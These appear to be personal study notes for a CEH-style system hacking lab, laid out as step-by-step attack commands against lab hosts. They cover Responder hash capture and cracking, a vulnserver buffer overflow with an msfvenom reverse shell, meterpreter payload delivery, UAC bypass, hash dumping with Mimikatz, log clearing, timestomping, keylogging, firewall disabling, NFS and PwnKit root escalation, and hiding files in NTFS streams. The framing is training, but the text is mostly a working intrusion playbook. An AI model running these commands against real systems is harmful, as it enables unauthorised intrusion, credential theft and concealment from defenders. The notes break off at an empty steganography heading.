*** System hacking is the process of testing computer systems and software for security vulnerabilities that an attacker could exploit to gain access to the organization’s systems to steal or misuse sensitive information. ***
======================================================================================================================================================================================================================================================================================================================================================================================================================================
# Perform Active Online Attack to Crack the System’s Password using Responder
-------------------------------------------------------------------------------
>>> Ubuntu Machine [Attacker/10.10.1.9]
1. cd Responder >>  chmod +x ./Responder.py  >>  sudo python2 ./Responder.py -I eth0 (responder start listining)
>>> Windows Machine [Target/10.10.1.11]
2. open run(ctrl+r)  >>  type "\\CEH-Tools "  >> click OK
>>> Ubuntu Machine [Attacker/10.10.1.9]
3. Responder starts capturing the access logs of the Windows 11 machine. It collects the hashes of the logged-in user of the target machine. Responder stores the logs in Home/Responder/logs. Navigate to the same location and double-click the SMB-NTLMv2-SSP-10.10.1.11.txt file
4.  sudo snap install john-the-ripper  (installing john to crack the hash captured by Responder)
5.  sudo john /home/ubuntu/Responder/logs/SMB-NTLMv2-SSP-10.10.1.11.txt        (cracking hash and give result)

=========================================================================================================================================================================================================================================================================================================================================================================================================================================

# Perform Buffer Overflow Attack to Gain Access to a Remote System
--------------------------------------------------------------------
nc -nc 10.10.1.11 9999 (connect vulnserver.exe to parrot machine netcat listner)   >> HELP   >> EXIT

1. spiking   

   >> trun.spk 

   >> (pluma trun.spk)

   >>  s_readline();
       s_string(“TRUN ”);
       s_string_variable(“0”);
   
   >>  generic_send_tcp 10.10.1.11 9999 trun.spk 0 0

2. fuzzing(Scripts)  

   >> ./fuzz.py(after #chmod +x fuzz.py)

3. >>  /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 11900   --> (It will generate a random piece of bytes)

   >>  pluma findoff.py (to add random bytes in offset variable)
  
   >>  ./findoff.py --> (When the above script is executed, it sends random bytes of data to the target vulnerable server, which causes a buffer overflow in the stack.)

   >>  /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 11900 -q 386F4337 --> (A result appears, indicating that the identified EIP register is at an offset of 2003 bytes)

4. >>  ./overwrite.py  (the Python script to send the generated random bytes to the vulnerable server.This Python script is used to check whether we can control the EIP register.)

5. >>  ./badchars.py  (identify bad characters that may cause issues in the shellcode.) [Characters such as no byte, i.e., “\x00”, are badchars.]

6. >> mona.py (we need to identify the right module of the vulnerable server that is lacking memory protection. In Immunity Debugger, you can use scripts such as mona.py to identify modules that lack memory protection.)

   >> !mona modules (immunity debugger text field present at the bottom of the immunity debugger window)[observe that there is no memory protection for the module essfunc.dll]

   >> /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb (This script is used to convert assembly language into hex code.)	[parrot Securtity]
   
   >> The nasm command line appears; type JMP ESP and press Enter.         [parrot Securtity]

   >> The result appears, displaying the hex code of JMP ESP (here, FFE4).       [parrot Securtity]  

   >> Type EXIT and press Enter to stop the script.

   >> In the Immunity Debugger window, type !mona find -s “\xff\xe4” -m essfunc.dll and press Enter. [Here, the return address of the vulnerable module is 0x625011af.]

7. >> Re-launch both Immunity Debugger and the vulnerable server as an administrator. Now, Attach the vulnserver process to Immunity Debugger.
   >> In the Immunity Debugger window, click the Go to address in Disassembler icon.
   >> The Enter expression to follow pop-up appears; enter the identified return address in the text box (here, 625011af) and click OK.
   >> You will be pointed to 625011af ESP; press F2 to set up a breakpoint at the selected address.
   >> Now, click on the Run program in the toolbar to run Immunity Debugger.
   >> ./jump.py

8. >> msfvenom -p windows/shell_reverse_tcp LHOST=[Local IP Address] LPORT=[Listening Port] EXITFUNC=thread -f c -a x86 -b “\x00”  (generate a shell code, copy code and paste in shellcode.py(overflow variable, line no 4))

   >>  pluma shellcode.py (paste shell code in overflow variable[line no 4] and save it and close it .)

   >>  nc -nvlp 4444

   >>  chmod +x shellcode.py

   >>  ./shellcode.py

   >>  #whoami                  [*** GAME OVER ***]

=========================================================================================================================================================================================================================================================================================================================================================================================================================================

# Escalate Privileges(Windows 11) using Privilege Escalation Tools and Exploit Client-Side Vulnerabilities AND post exploitations :
------------------------------------------------------------------------------------------------------------------------------------
>>> Parrot Machine [Attacker/10.10.1.13]
1. msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -e x86/shikata_ga_nai -b "\x00" LHOST=10.10.1.13 -f exe > /home/attacker/Desktop/Exploit.exe (creating payload using msfvenom)
2. mkdir /var/www/html/share  >>  chmod -R 755 /var/www/html/share   >>  chown -R www-data:www-data /var/www/html/share  >>  ls -la /var/www/html/ | grep share  (sending the malicious payload through a shared directory) 
3. cp /home/attacker/Desktop/Exploit.exe /var/www/html/share/     (copy payload to shared directory)
4. service apache2 start
5. msfconsole  >>  use exploit/multi/handler  >>  set payload windows/meterpreter/reverse_tcp  >>  show options (set lhost or lport)  >>  exploit -j -z 
>>> Windows Machine [Target/10.10.1.11]
6. Open browser(firefox)  >> search for "http://10.10.1.13/share" >> download and run exploit.exe
>>> Parrot Machine [Attacker/10.10.1.13]
7.  sessions -i 1  >> getuid >> sysinfo >> run vnc   (Meterpreter session 1 opened)

8. upload /root/PowerSploit/Privesc/PowerUp.ps1 PowerUp.ps1(PowerUp.ps1 is a program that enables a user to perform quick checks against a Windows machine for any privilege escalation opportunities. It utilizes various service abuse checks, .dll hijacking opportunities, registry checks, etc. to enumerate common elevation methods for a target system.)
9. shell(to get shell access) >>  powershell -ExecutionPolicy Bypass -Command “. .\PowerUp.ps1;Invoke-AllChecks” (to run the PowerUp.ps1 file)

10. Places(top menu on the desktop)  >>  Network >>   press Ctrl+L  >> smb://10.10.1.11  >> Credentials(Admin,Pa$$w0rd)10.
11. upload /home/attacker/Desktop/BeRoot/beRoot.exe       [In Terminal(meterpreter)]
13. shell  (to open a shell session)    >>  dir  >>  beroot.exe  (beroot start his work and show you the result in terminal and you can use that information to find vulnerability in targat system.)

14. background  >>  upload /home/attacker/Desktop/BeRoot/Seatbelt.exe
15. shell >> dir >> Seatbelt.exe -group=system(gather information about AMSIProviders, AntiVirus, AppLocker etc)  >>  Seatbelt.exe -group=user (gather information about ChromiumPresence, CloudCredentials, CloudSyncProviders, CredEnum, dir, DpapiMasterKeys etc) >> Seatbelt.exe -group=misc (gather information about ChromiumBookmarks, ChromiumHistory, ExplicitLogonEvents, FileInfo etc)
16. exit (to go back to meterpreter and close shell)
17. background (type in meterpreter session to run current session in background and use msf for run new exploits,payload,post,etc)
18. use exploit/windows/local/bypassuac_fodhelper (use exploit to bypassuac)    >>  show option >> set session 1
19. set payload/windows/meterpreter/reverse_tcp >> show options >> set lhost, lport >> set target 0 >> exploit   (Meterpreter session 2 opened)
20. getsystem -t 1  [using named pipe impersonation technique for escalating privileges]
21. getuid >> sysinfo   >>     run post/windows/gather/smart_hashdump (extracts the NTLM hashes)    >>    clearev (clearing logs)

# Escalate Privileges by Bypassing UAC and Exploiting Sticky Keys 
22. background  >>  use post/windows/manage/sticky_keys >> sessions i*  >>  set session 2(privileged session)  >> exploit 

# Escalate Privileges to Gather Hashdump using Mimikatz
23. load kiwi >>  help kiwi  >>  
    >> lsa_dump_sam (to load NTLM Hash of all users.)
    >> lsa_dump_secrets (LSA secrets are used to manage a system's local security policy, and contain sensitive data such as User passwords, IE passwords, service account passwords, SQL passwords etc.)
    >> "password_change -u Admin -n [NTLM hash of Admin acquired in previous step] -P password" (change the password of Admin using the password_change module)

24. POST EXPLOITATIONS (In Metasploit) : 
   a. sysinfo , ipconfig  , getuid , pwd , ls , cat [filename.txt]
   b. While performing post-exploitation activities, an attacker tries to access files to read their contents. Upon doing so, the MACE (modified/-m, accessed/-a, created/-c, entry/-e) attributes immediately change, which indicates to the file user or owner that someone has read or modified the information. To leave no trace of these MACE attributes, use the timestomp command to change the attributes as you wish after accessing a file. 
      >> timestomp Secret.txt -v   (This displays the created time, accessed time, modified time, and entry modified time)
      >> timestomp Secret.txt -m “02/11/2018 08:10:03”   (changes the Modified value of the Secret.txt file)
      >> Similarly, you can change the Accessed (-a), Created (-c), and Entry Modified (-e) values of a particular file
   c.  search -f [Filename.extension] (here, pagefile.sys)      [displays the location of the searched file]
   d. KEYLOGING : capturing all keyboard input from the target system.
      >> keyscan_start  (start keyloging)
      >> keyscan_dump  (show all the captured keystrokes)
   e. idletime (display the amount of time for which the user has been idle on the remote system)

25. POST EXPLOITATIONS (In Shell) :
   a. dir /a:h    ( retrieve the directory names with hidden attributes)
   b. sc queryex type=service state=all     ( to list all the available services)
   c. Now, we will list details about specific service : 
      >> netsh firewall show state    (display current firewall state.)
      >> netsh firewall show config   (view the current firewall settings in the target system.)
      >> wmic /node:"" product get name,version,vendor      ( view the details of installed software)
      >> wmic cpu get     ( to retrieve the processor’s details)
      >> wmic useraccount get name,sid    (to retrieve login names and SIDs of the users)
      >> net start or stop       (Starts/stops a network service)
      >> netsh advfirewall set currentprofile state off       (Turn off firewall service for current profile)
      >> netsh advfirewall set allprofiles state off        (Turn off firewall service for all profiles)
   d. Post Escalating PRIVILEGES
      >> findstr /E ".txt" > txt.txt        (Retrieves all the text files (needs privileged access))
      >> findstr /E ".log" > log.txt      (Retrieves all the log files (needs privileged access))
      >> findstr /E ".doc" > doc.txt      (Retrieves all the document files (needs privileged access))
   e. wmic os where Primary='TRUE' reboot     (to reboot the target system)

=======================================================================================================================================================================================================================================================================================================================================================================================================================================

# Escalate Privileges in Linux Machine by Exploiting Misconfigured NFS(Network File System) :-
--------------------------------------------------------------------------------------------
[Network File System (NFS) is a protocol that enables users to access files remotely through a network. Remote NFS can be accessed locally when the shares are mounted. If NFS is misconfigured, it can lead to unauthorized access to sensitive data or obtain a shell on a system.] 
>>> UBUNTU MACHINE [TARGET]
1. sudo apt install nfs-kernel-server
2. sudo nano /etc/exports   >>  /home *(rw,no_root_squash) >>  CTRL+S(save) >> CTRL+X(exit) 
3. sudo /etc/init.d/nfs-kernel-server restart               (restart nfs server to apply configurations changes.)
>>> PARROT MACHINE [ATTACKER]
4. nmap -sV 10.10.1.9              (see that the port 2049 is open and nfs service is running on it)
5. sudo apt-get install nfs-common        (client that access the directory shared by nfs-kernel-server)
6. showmount -e 10.10.1.9               (check if any share is available for mount in the target machine)
7. mkdir /tmp/nfs
8. sudo mount -t nfs 10.10.1.9:/home /tmp/nfs            (to mount the nfs directory on the target machine.)
9. cd /tmp/nfs
10. sudo cp /bin/bash .               [here, .(dot) is for present directory \ means copy bash file in pwd]
11. sudo chmod +s bash
12. ls -la bash
13. sudo df -h                      (get the amount of free disk available)
14. ssh -l ubuntu 10.10.1.9   >> toor(password)                 (login into target machine using ssh)
15. cd /home >> ls
16. ./bash -p                 (-p : start bash with root privileges )
17. id >>  whoami  >>  cp /bin/nano .  >> chmod 4777 nano   >>  ls -la nano  >> ls >>  ./nano -p /etc/shadow (showing the hashes of all users You can copy any hash from the file and crack it using john the ripper or hashcat tools, to get the password of desired users)  
18. cat /etc/crontab        (to view the running cronjobs)
19. ps -ef         (to view current processes along with their PIDs)
20. find / -name "*.txt" -ls 2> /dev/null    (view all the .txt files on the system)
21. route -n          (view the host/network names in numeric form)
22. find / -perm -4000 -ls 2> /dev/null          (view the SUID executable binaries)

============================================================================================================================================================================================================================================================================================================================================================================================================

# Escalate Privileges(linux) by Exploiting Vulnerability in pkexec(CVE-2021-4034)
--------------------------------------------------------------------------
>>> PARROT MACHINE  
1. whoami  >>   mkdir /tmp/pwnkit  >>  mv CVE-2021-4034 /tmp/pwnkit/  >>  cd /tmp/pwnkit/CVE-2021-4034/  >>  make  >> ./cve-2021-4034  >> whoami 

=============================================================================================================================================================================================================================================================================================================================================================================================================

# Hide files using NTFS streams(windows)
-----------------------------------------

1. In C:\ drive, create a New Folder, and name it magic.
2. Navigate to the location C:\Windows\System32, copy calc.exe, and paste it to the C:\magic location
3. Go to C:\magic >> click on file navigation bar >> type cmd  |OR|  open cmd and type "cd C:\magic"
4. Now type in cmd,
  >>> notepad readme.txt  >>  yes(Notepad pop-up appears)  >> type something in notepad  >> save(ctrl+s)  >> close notepad
  >>> dir 
  >>> "type c:\magic\calc.exe > c:\magic\readme.txt:calc.exe"       (This command will hide calc.exe inside the readme.txt.)         
Navigate to the directory C:\magic and delete calc.exe
  >>> "mklink backdoor.exe readme.txt:calc.exe"    
  >>> backdoor.exe     ( The calculator program will execute)
For demonstration purposes, we are using the same machine to execute and hide files using NTFS streams. In real-time, attackers may hide malicious files in the target system and keep them invisible from the legitimate users by using NTFS streams, and may remotely execute them whenever required

=============================================================================================================================================================================================================================================================================================================================================================================================================

# Hide Data using White Space Steganography (Tool : SNOW.EXE)
--------------------------------------------------------------
1. create a folder(snow) on desktop and open it  >>  copy and paste the snow.exe in snow folder >> 
2. In snow folder click on navigation bar and type "cmd" and press enter  |OR|  open cmd and type "cd C:\users\Admin\Desktop\Snow"  |OR|  open snow folder, right click on blank place and select option "open in terminal".
3. In cmd type "notepad"  >>  notepad will open  >> type something (Hello world!)  >> save file (input.txt) >> close notepad
4. In cmd type (snow -C -m "My swiss bank account number is 45656684512263" -p "magic" input.txt output.txt)
     > -C Compress the data if concealing, or uncompress it while extracting.
     > -p For setting the password for concealment of data and while extracting the data.
     > -m Message String The content written in this flag will be concealed into the input file.
     > output.txt : file that will automatically be created in the same location with the secret message.
5. To check the file in the GUI, open the output.txt in Notepad, and go to Edit --> Select All. You will see the hidden data inside output.txt in the form of spaces and tabs.
6. In cmd type (snow -C -p "magic" output.txt) to show the hidden txt.

=========================================================================================================================================================================================================================================================================================================================================================================================================================

# Image Steganography using OpenStego and StegOnline
------------------------------------------------------







